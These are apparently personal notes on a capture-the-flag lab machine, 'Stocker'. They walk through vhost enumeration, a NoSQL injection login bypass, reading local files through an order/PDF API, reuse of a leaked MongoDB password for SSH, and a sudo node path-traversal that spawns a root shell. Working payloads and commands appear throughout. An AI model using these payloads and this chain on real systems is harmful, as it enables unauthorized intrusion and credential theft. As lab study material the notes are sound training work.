-----

## Initial Information-

### IPs

victim  -  10.10.11.196
Date Started:2023-04-15

----
## Initial Recon

- did an initial scan and found that 22 and 80 are open and using ssh and n
```shell

nmap -O -sV -p- stoker.htb
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-15 12:40 EDT
Nmap scan report for stoker.htb (10.10.11.196)
Host is up (0.027s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=4/15%OT=22%CT=1%CU=31093%PV=Y%DS=2%DC=I%G=Y%TM=643AD3A
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST1
OS:1NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%
OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD
OS:=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.53 seconds

```

- added the ip to the hosts lists so I didnt need to rember the ip.
- Given that it is a webserver I decided to use dirbuster to see if there are any hidden domains.
	- The list that I decided to use is the seclists 
```shell
gobuster vhost -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u stocker.htb -t 50 --append-domain
```

- I found that there was a dev.stocker.htb domain that contains a login page 
```shell
gobuster vhost -w subdomains-top1million-5000.txt -u stocker.htb -t 50 --append-domain  
 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             http://stocker.htb
[+] Method:          GET
[+] Threads:         50
[+] Wordlist:        subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/04/16 08:20:37 Starting gobuster in VHOST enumeration mode
===============================================================
Found: dev.stocker.htb Status: 302 [Size: 28] [--> /login]
Progress: 4415 / 4990 (88.48%)
===============================================================
2023/04/16 08:20:40 Finished
===============================================================
```
- entering the url in the in browser brings us to a login.  
![[Pasted image 20230416133042.png]]

- investigaging the webform, I decided to see if the form is vunirable to Using [SQL Injection](https://portswigger.net/web-security/sql-injection) to Bypass Authentication using {{7`*`7}} this didnt give anything this just gave the default `Invalid Username or password`, I also tried 1=1-- ' this didn't  bear fruit. 
- I then tried to check for JSON compatiablility which involves changing the content type to application/json and using some of the parameters on the Hacktricks site 
```POST
POST /login HTTP/1.1

Host: dev.stocker.htb

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/json

Content-Length: 57

Origin: http://dev.stocker.htb

Connection: close

Referer: http://dev.stocker.htb/login

Cookie: connect.sid=s%3AIhO6lY-2aBFAjFehNRDu0KT72grVAYiF.9brbf7scPJZklInizBZnDe4IdHWJtOycbUkV02S2DdU

Upgrade-Insecure-Requests: 1


{"username": {"$ne": null}, "password": {"$ne": null} }

```

I sent the request through and this worked I was sent a link that redirects to a /stock page
```POST
HTTP/1.1 302 Found

Server: nginx/1.18.0 (Ubuntu)

Date: Sun, 16 Apr 2023 13:01:25 GMT

Content-Type: text/html; charset=utf-8

Content-Length: 56

Connection: close

X-Powered-By: Express

Location: /stock

Vary: Accept



<p>Found. Redirecting to <a href="/stock">/stock</a></p>

```

- got the obeject for an Item 
```json 
{
  "_id": "638f116eeb060210cbd83a8d",
  "title": "Cup",
  "description": "It's a red cup.",
  "image": "red-cup.jpg",
  "price": 32,
  "currentStock": 4,
  "__v": 0,
  "amount": 1
}
```
- based on researrch in the network tab of burpsuite found that there are API endpoints  for this domain http://dev.stocker.htb/api/products
- clicking on the submit order gives a /api/order endpoint and an Order Id
- Cliing on the view invoice gives a pdf that contains the details of the order. It also gives an Endpoint of http://dev.stocker.htb/api/po/643bfc4a44e64624c3df5e8b
![[Pasted image 20230416145113.png]]

- Looking at more detail at the structure of the order request we get the following 
```POST
POST /api/order HTTP/1.1

Host: dev.stocker.htb

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: */*

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Referer: http://dev.stocker.htb/stock

Content-Type: application/json

Origin: http://dev.stocker.htb

Content-Length: 162

Connection: close

Cookie: connect.sid=s%3AIhO6lY-2aBFAjFehNRDu0KT72grVAYiF.9brbf7scPJZklInizBZnDe4IdHWJtOycbUkV02S2DdU



{"basket":[{"_id":"638f116eeb060210cbd83a8d","title":"Cup","description":"It's a red cup.","image":"red-cup.jpg","price":32,"currentStock":4,"__v":0,"amount":1}]}
```

- after investigaing the the different parameters, I found that I could access the passwd file by setting the src to file:////etc/passwd by the title paramter
```shell 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:112:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:113::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:114::/nonexistent:/usr/sbin/nologin
landscape:x:109:116::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
fwupd-refresh:x:112:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
mongodb:x:113:65534::/home/mongodb:/usr/sbin/nolog

```

- I then found the index.js for the dev subdomain by traversing the file system, I found that this contiins the mongoose credentials

```js

const express = require("express");
const mongoose = require("mongoose");
const session = require("express-session");
const MongoStore = require("connect-mongo");
const path = require("path");
const fs = require("fs");
const { generatePDF, formatHTML } = require("./pdf.js");
const { randomBytes, createHash } = require("crypto");
const app = express();
const port = 3000;
// TODO: Configure loading from dotenv for production
const dbURI = "mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&w=1";
app.use(express.json());
app.use(express.urlencoded({ extended: false }));
app.use(
session({
secret: randomBytes(32).toString("hex"),
resave: false,
saveUninitialized: true,
store: MongoStore.create({
mongoUrl: dbURI,
}),
})
);
app.use("/static", express.static(__dirname + "/assets"));
app.get("/", (req, res) => {
return res.redirect("/login");
});
app.get("/api/products", async (req, res) => {
if (!req.session.user) return res.json([]);
const products = await mongoose.model("Product").find();
return res.json(products);
});
app.get("/login", (req, res) => {
if (req.session.user) return res.redirect("/stock
```

Based on the information I confirmed that the database is mongodb and that the database password is as follows- IHeardPassphrasesArePrettySecure

I then tried to ssh into the machine using angoose and IHeardPassphrasesArePrettySecure. 

This proved to be succesful - 
```shell
ssh angoose@stocker.htb
The authenticity of host 'stocker.htb (10.10.11.196)' can't be established.
ED25519 key fingerprint is SHA256:jqYjSiavS/WjCMCrDzjEo7AcpCFS07X3OLtbGHo/7LQ.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:3: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'stocker.htb' (ED25519) to the list of known hosts.
angoose@stocker.htb's password: 

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

angoose@stocker:~$ 

```

- found the user flag in the user.txt
- 6b66ec093a9dc5fb98fdbf86dcf75287
I then looked to see what we can use for priviliege escalation based on the rule of wildcards in a folder, I beleved that any script

```js

require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})

```

```shell
angoose@stocker:~$ sudo /usr/bin/node /usr/local/scripts/../../../tmp/exploit.js
# ls
exploit.js  exploitjs  user.txt
# /root
/bin/sh: 2: /root: Permission denied
# ls
exploit.js  exploitjs  user.txt
# whoami
root

```


- After getting the root access I then found the flag in the /root/root.txt
- f5583c486e777bc412336ec1063ae429

----
## Foothold


---
## Tags

----
## Resources
- Seclist for DNS - https://github.com/danielmiessler/SecLists
- NoSQL injection- https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass
- https://blog.213.se/stocker-hackthebox/
- SQL bypass Burp- https://portswigger.net/support/using-sql-injection-to-bypass-authentication 
- wild card file rules for root escalation- https://materials.rangeforce.com/tutorial/2019/11/08/Linux-PrivEsc-Wildcard/
- Script to expoilt https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-path-traversal-privilege-escalation/